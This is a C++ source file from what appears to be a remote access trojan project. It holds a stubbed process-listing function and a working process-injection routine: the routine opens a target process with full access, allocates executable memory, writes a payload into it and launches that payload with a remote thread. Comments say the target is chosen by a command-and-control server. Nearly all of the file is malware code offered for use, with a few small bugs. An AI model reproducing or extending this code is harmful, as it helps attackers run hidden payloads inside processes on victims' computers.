// Patrick Sacchet
// Version 1.0
// RAT-Exe-Injection.cpp : This file contains functionality for injecting into a target process

#include "RAT-Exe-Injection.h"

// parse through all processes and send them back to our C2
INT parseProcesses(__inout char*** procs, __inout char** procPIDs, __inout INT* numProcs)
{
	INT status = ERROR_SUCCESS;










cleanup:
	return status;
}







// take PID from C2 to inject into 
INT inject(__in UINT32 PID, __in UINT64 payloadSize, __in char* payloadPath)
{
	INT status = ERROR_SUCCESS;
	CHAR messageBuffer [MAX_BUFFER_SIZE];
	LPVOID baseAddress = NULL;
	HANDLE hProcess, hThread;
	UINT64 numBytesWritten = 0;
	LPDWORD threadID = { };


	sprintf_s(messageBuffer, "RAT-Exe-Inject::inject - Injecting into process %d\n", PID);
	OutputDebugStringA(messageBuffer);

	//hProcess = OpenProcess(PROCESS_VM_WRITE | PROCESS_VM_READ, FALSE, PID);
	hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, PID);
	if (hProcess == INVALID_HANDLE_VALUE)
	{
		OutputDebugStringA("RAT-Exe-Inject::inject - Failed to open handle to target process!\n");
		status = GetLastError();
		goto cleanup;
	}

	OutputDebugStringA("RAT-Exe-Inject::inject - Successfully opened process!\n");

	// allocate memory in target process
	baseAddress = VirtualAllocEx(hProcess, NULL, payloadSize, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
	if (baseAddress == NULL)
	{
		sprintf_s(messageBuffer, "RAT-Exe-Inject::inject - Failed to allocate memory in target process! Error %d\n", GetLastError());
		OutputDebugStringA(messageBuffer);
		status = ERROR_NOT_ENOUGH_MEMORY;
		goto cleanup;
	}

	OutputDebugStringA("RAT-Exe-Inject::inject - Successfully allocated memory in target process\n");

	// TODO: just change this to dll path? for payload bytes...
	if(!WriteProcessMemory(hProcess, baseAddress, payloadPath, payloadSize, &numBytesWritten))
	{
		sprintf_s(messageBuffer, "RAT-Exe-Inject::inject - Failed to write payload into target process! Error 0x%X\n", GetLastError());
		OutputDebugStringA(messageBuffer);
		status = GetLastError();
		goto cleanup;
	}

	OutputDebugStringA("RAT-Exe-Inject::inject - Successfully wrote payload to target process!\n");

	hThread = CreateRemoteThreadEx(hProcess, NULL, payloadSize, (LPTHREAD_START_ROUTINE)baseAddress, NULL, 0, NULL, threadID);
	if (hThread == NULL)
	{
		sprintf_s(messageBuffer, "RAT-Exe-Inject::inject - Failed to start remote thread! Error %d\n", GetLastError());
		OutputDebugStringA(messageBuffer);
		status = GetLastError();
		goto cleanup;
	}

	OutputDebugStringA("RAT-Exe-Inject::inject - Successfully created thread! Waiting for it to finish...\n");

	WaitForSingleObject(hThread, INFINITE);

	OutputDebugStringA("RAT-Exe-Inject::inject - Thread finished!\n");

	status = ERROR_SUCCESS;


cleanup:
	return status;
}


